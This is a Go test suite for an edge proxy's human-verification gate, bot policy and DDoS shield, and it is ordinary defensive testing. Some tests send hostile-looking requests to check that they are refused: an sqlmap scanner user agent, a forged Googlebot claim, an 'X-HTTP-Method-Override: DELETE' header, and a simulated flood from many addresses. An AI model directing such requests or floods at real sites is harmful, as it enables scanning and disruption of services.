				srv.Config = edge.Server("")
				srv.Config.Handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
					defer close(done)
					switch {
					case tc.failure != nil:
						w = gateFailedHijacker{w, tc.failure}
					case tc.unsupported:
						w = gatePlainWriter{w}
					case tc.wrapped:
						w = gateUnwrapWriter{w}
					}
					edge.ServeHTTP(w, r)
				})
				srv.Start()
				t.Cleanup(srv.Close)
				path := "/gate/hijack"
				if tc.handled {
					path += "-handled"
				}
				probe := &setup{addr: strings.TrimPrefix(srv.URL, "http://")}
				status, reply := probe.raw(t, strings.Replace(get(path), "GET ", tc.method+" ", 1))
				select {
				case <-done:
				case <-time.After(5 * time.Second):
					t.Fatal("the edge handler did not return")
				}
				hijackErr := <-g.hijack
				wantStatus, wantOrigin := http.StatusForbidden, 0
				if tc.failure != nil || tc.unsupported {
					wantStatus, wantOrigin = http.StatusOK, 1
					expected := tc.failure
					if tc.unsupported {
						expected = http.ErrNotSupported
					}
					if !errors.Is(hijackErr, expected) {
						t.Errorf("handoff error %v, want %v", hijackErr, expected)
					}
				} else if hijackErr != nil || !strings.Contains(reply, "from the gate") {
					t.Errorf("handoff response: %v, %q", hijackErr, reply)
				}
				if got := len(up.requests()); status != wantStatus || got != wantOrigin {
					t.Errorf("status %d, origin requests %d; want %d, %d", status, got, wantStatus, wantOrigin)
				}
				ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancel()
				if err := srv.Config.Shutdown(ctx); err != nil {
					t.Fatal(err)
				}
				edge.conns.mu.Lock()
				pending, groups := len(edge.conns.counted), len(edge.conns.perIP)
				edge.conns.mu.Unlock()
				if pending != 0 || groups != 0 {
					t.Errorf("closed connection still counted: connections=%d addresses=%d", pending, groups)
				}
			})
		}
	})
	t.Run("it sees the trailers after the body, and what it takes off is not sent", func(t *testing.T) {
		_, reply := s.raw(t, get("/trailers"))
		if strings.Contains(strings.ToLower(reply), "x-gate-only") || !strings.Contains(reply, "Grpc-Status: 0 seen\r\n") ||
			!strings.Contains(reply, "reached the application") {
			t.Fatalf("%q", reply)
		}
		// An interim response, which Respond never sees, never reaches the visitor at all.
		if _, reply := s.raw(t, get("/early-hints")); strings.Contains(reply, "103") || strings.Contains(reply, "X-Gate-Only") {
			t.Fatalf("%q", reply)
		}
	})
	t.Run("what it adds to a response is hardened like the rest", func(t *testing.T) {
		if _, reply := s.raw(t, get("/learned")); !strings.Contains(reply, "Set-Cookie: learned=1\r\n") || !strings.Contains(reply, "Cache-Control: private, no-store\r\n") {
			t.Fatalf("%q", reply)
		}
	})
	t.Run("it reads no more of a body than the site takes", func(t *testing.T) {
		body := strings.Repeat("a", 200<<10) // over the 128 KiB form limit
		_, reply := s.raw(t, "POST /gate/read HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\nContent-Type: application/json\r\n"+
			"Content-Length: "+strconv.Itoa(len(body))+"\r\nConnection: close\r\n\r\n"+body)
		if !strings.Contains(reply, "X-Read: 131072 true\r\n") {
			t.Fatalf("%q", reply[:min(len(reply), 300)])
		}
	})
	t.Run("a report after it answered is not the request's", func(t *testing.T) {
		s.raw(t, get("/gate/late"))
		before := len(matched(idGateRefused))
		g.mu.Lock()
		late := g.late
		g.mu.Unlock()
		late(challenge.Outcome{Verdict: challenge.Refused})
		if len(matched(idGateRefused)) != before {
			t.Fatal("a late report was alerted")
		}
		// One under way when Serve returns is the request's, and ends before the request goes on.
		g := &gate{inside: make(chan struct{})}
		release := make(chan struct{})
		var s *setup
		var forwarded atomic.Int64
		forwarded.Store(-1)
		s = start(t, func(c *Config) {
			c.Challenge = g
			c.OnMatch = func(m Match) {
				if m.RuleID == idGateRefused {
					close(g.inside)
					<-release
					forwarded.Store(int64(len(s.up.requests())))
				}
			}
		})
		time.AfterFunc(50*time.Millisecond, func() { close(release) })
		if status, _ := s.raw(t, get("/gate/racing")); status != 200 || forwarded.Load() != 0 {
			t.Fatalf("%d; the application had %d requests when the report ended", status, forwarded.Load())
		}
	})
	t.Run("without a bot policy it is told what the request says it is", func(t *testing.T) {
		g := &gate{}
		s := start(t, func(c *Config) { c.Challenge = g })
		s.raw(t, "GET /page HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: curl/8.5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n")
		if sig := g.signals(); len(sig) != 1 || sig[0].Kind != alert.ClientTool || sig[0].Watched {
			t.Fatalf("signals %+v", sig)
		}
	})
	t.Run("a refusal is alerted once, with a plain reason", func(t *testing.T) {
		if status, _ := s.raw(t, get("/gate/refuse")); status != 403 {
			t.Fatalf("%d", status)
		}
		got := matched(idGateRefused)
		want := "the person check refused the visitor, score 100: straight-line+20, script" + strings.Repeat("x", 64-len("straight-line+20, script"))
		if len(got) != 1 || got[0].Message != want || !got[0].Disruptive {
			t.Fatalf("matches %+v", got)
		}
		if sig := alert.Signature(got[0].RuleID); sig != "challenge-5007001" {
			t.Fatalf("signature %q", sig)
		}
	})
	t.Run("a person it accepts is admitted past the shield", func(t *testing.T) {
		_, reply := s.raw(t, get("/gate/pass"))
		if !strings.Contains(reply, "Set-Cookie: carnical_clr=") || len(matched(idGateRefused)) != 1 {
			t.Fatalf("%q", reply)
		}
		if _, reply := s.raw(t, get("/gate/show")); strings.Contains(reply, "carnical_clr") {
			t.Fatal("a check only shown admitted the visitor")
		}
	})
	t.Run("what the bot policy refuses never reaches it", func(t *testing.T) {
		before := len(g.signals())
		status, _ := s.raw(t, "GET /gate/pass HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: sqlmap/1.8\r\nConnection: close\r\n\r\n")
		if status != 403 || len(g.signals()) != before {
			t.Fatalf("%d; %d offers", status, len(g.signals())-before)
		}
	})
	t.Run("nor does what the request policy refuses", func(t *testing.T) {
		before := len(g.signals())
		if status, _ := s.raw(t, "GET /gate/pass HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\nX-HTTP-Method-Override: DELETE\r\nConnection: close\r\n\r\n"); status != 400 || len(g.signals()) != before {
			t.Fatalf("%d; %d offers", status, len(g.signals())-before)
		}
	})
}

// During an attack the person check stands in for the shield's challenge and for its refusal of strangers over the
// attack's budget, and a person it accepts is admitted through the rest of the attack; a ban is never offered to it.
func TestThePersonCheckStandsInForTheShieldsChallenge(t *testing.T) {
	now := time.Date(2026, 10, 19, 9, 0, 0, 0, time.UTC)
	var clock atomic.Int64
	clock.Store(now.UnixNano())
	sh, err := shield.New(shield.Config{Now: func() time.Time { return time.Unix(0, clock.Load()) },
		KnownAfter: 3, KnownMinAge: 3 * time.Second, MinUnknownRate: 1, ClusterRate: 1, SubnetRate: 1e6, SubnetBurst: 1e6,
		BanAfter: 3, ChallengeBits: 8,
		Detector: shield.DetectorConfig{Warmup: 4 * time.Second, MinHistory: 3 * time.Second, Tau: time.Minute, MinAttackRate: 50,
			Confirm: 2, MinAttack: time.Hour, ExitQuiet: time.Hour}})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(sh.Close)
	g := &gate{}
	up := newUpstream(t)
	cfg := Config{Upstream: mustURL(up.URL), CRS: crs.DefaultSettings(), Origin: loopback, Shield: sh, Challenge: g, MaxConnsPerIP: -1,
		Bots: &bots.Policy{Refuse: 1<<alert.ClientScanner | 1<<alert.ClientFake, Watch: 1 << alert.ClientTool,
			Verifier: bots.NewVerifier(noDNS{}, 0, 0), Exempt: []netip.Prefix{netip.MustParsePrefix("198.51.100.32/32")}}}
	cfg.CRS.Mode = crs.ModeOff
	e, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { e.Close() })
	agent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/141.0"
	send := func(from, target string, nav bool, cookies ...*http.Cookie) *httptest.ResponseRecorder {
		r := httptest.NewRequest(http.MethodGet, target, nil)
		r.RemoteAddr = from + ":40000"
		r.Header.Set("User-Agent", agent)
		if nav {
			r.Header.Set("Accept", "text/html,application/xhtml+xml")
			r.Header.Set("Sec-Fetch-Mode", "navigate")
			r.Header.Set("Sec-Fetch-Dest", "document")
		} else {
			r.Header.Set("Accept", "application/json")
		}
		for _, c := range cookies {
			r.AddCookie(c)
		}
		w := httptest.NewRecorder()
		e.ServeHTTP(w, r)
		return w
	}
	second := func() { clock.Add(int64(time.Second)); sh.Tick() }
	// A quiet baseline, then a flood from a thousand addresses.
	for i := range 12 {
		for j := range 5 {
			send(fmt.Sprintf("192.0.2.%d", j+1), fmt.Sprintf("/static/%d.css", i), false)
		}
		second()
	}
	for i := 0; i < 8 && sh.State() != shield.Attack; i++ {
		for j := range 400 {
			send(fmt.Sprintf("10.%d.%d.1", i, j%250), "/api/items", false)
		}
		second()
	}
	if sh.State() != shield.Attack {
		t.Fatalf("no attack: %v", sh.State())
	}
	// Strangers loading pages spend their budget; then a page load gets the shield's challenge.
	for i := 0; send(fmt.Sprintf("10.201.%d.%d", i/250, i%250+1), "/other", true).Code != http.StatusServiceUnavailable; i++ {
		if i > 5000 {
			t.Fatal("strangers are never challenged")
		}
	}
	before := len(g.signals())

	visitor := "198.51.100.20"
	w := send(visitor, "/gate/show", true)
	sig := g.signals()
	if w.Body.String() != "from the gate" || len(sig) != before+1 {
		t.Fatalf("a page load was not given to the check: %d %q", w.Code, w.Body)
	}
	if got := sig[len(sig)-1]; got.Point != challenge.Admission || !got.Attack || got.Known || got.Kind == 0 { // the bot policy has not run: what the request says
		t.Fatalf("signals %+v", got)
	}
	if w := send(visitor, "/other", true); !strings.Contains(w.Body.String(), "One moment") {
		t.Fatalf("a page the check lets go on did not get the shield's own challenge: %d %q", w.Code, w.Body)
	}
	// Its answer is not a page load, and looks like the attack: over the attack's budget it is refused, and the check
	// takes it all the same.
	for i := 0; send("10.250.0.1", "/api/items", false).Code != http.StatusServiceUnavailable; i++ {
		if i > 100 {
			t.Fatal("the attack's budget is never spent")
		}
	}
	w = send(visitor, "/gate/pass", false)
	var clr *http.Cookie
	for _, c := range w.Result().Cookies() {
		if c.Name == "carnical_clr" {
			clr = c
		}
	}
	if last := g.signals()[len(g.signals())-1]; w.Body.String() != "from the gate" || clr == nil || w.Header().Get("Connection") != "close" || last.Point != challenge.Admission {
		t.Fatalf("the answer, in place of a refusal: %d %q %v %+v", w.Code, w.Body, w.Header(), last)
	}
	seenBefore := len(up.requests())
	if w := send(visitor, "/basket", false, clr); w.Code != 200 || len(up.requests()) != seenBefore+1 {
		t.Fatalf("a person the check accepted was not admitted: %d %q", w.Code, w.Body)
	}
	if w := send(visitor, "/basket", false); w.Code != http.StatusServiceUnavailable {
		t.Fatalf("control: without the clearance: %d", w.Code)
	}
	// A kind of client the bot policy refuses is not offered: the shield's answer stands.
	before = len(g.signals())
	agent = "sqlmap/1.8"
	if w := send("198.51.100.30", "/gate/show", true); w.Body.String() == "from the gate" || len(g.signals()) != before {
		t.Fatalf("a scanner was offered to the check: %d %q", w.Code, w.Body)
	}
	// Nor is a claim to be a search engine's crawler, which only the bot policy's check of its address can confirm, where
	// the policy refuses fakes.
	agent = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
	if w := send("198.51.100.31", "/gate/show", true); w.Body.String() == "from the gate" || len(g.signals()) != before {
		t.Fatalf("a search engine's claim was offered to the check: %d %q", w.Code, w.Body)
	}
	// A kind the policy watches is told as watched, but not from an address it exempts.
	agent = "curl/8.5.0"
	for _, tc := range []struct {
		from    string
		watched bool
	}{{"198.51.100.33", true}, {"198.51.100.32", false}} {
		send(tc.from, "/gate/show", true)
		if sig := g.signals(); len(sig) == before || sig[len(sig)-1].Watched != tc.watched {
			t.Fatalf("a tool from %s: %+v", tc.from, sig[len(sig)-1])
		}
		before = len(g.signals())
	}
	agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/141.0"
	// The refusal the check stood in for counts toward the address's ban as the shield's own did, and once: the check's
	// refusal adds nothing. The ban is never offered to the check.
	bot := "198.51.100.66"
	rejected := sh.Snapshot().SecurityRejections
	before = len(g.signals())
	for range 3 {
		send(bot, "/gate/refuse", false)
	}
	if got := g.signals()[before]; got.Strikes != 1 || sh.Snapshot().SecurityRejections != rejected {
		t.Fatalf("the refusals: first offer %+v; %d rejections counted", got, sh.Snapshot().SecurityRejections-rejected)
	}
	before = len(g.signals())
	if w := send(bot, "/gate/show", true); w.Code != http.StatusForbidden || len(g.signals()) != before {
		t.Fatalf("a banned address: %d %q, %d offers", w.Code, w.Body, len(g.signals())-before)
	}
}
